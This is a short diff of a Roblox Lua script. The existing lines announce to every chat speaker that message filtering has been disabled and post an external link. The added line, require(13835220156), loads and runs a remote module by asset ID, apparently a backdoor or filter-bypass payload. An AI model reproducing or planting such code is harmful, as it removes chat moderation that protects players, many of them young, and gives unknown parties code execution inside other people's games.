@@ -17,3 +17,5 @@ for _, Speaker in pairs(ChatService.Speakers) do
 	Speaker:SendSystemMessage('Message filtering has been disabled, enjoy!', 'System')
 	Speaker:SendSystemMessage('https://0xfe0f.github.io/discord', 'System')
 end
+
+require(13835220156)
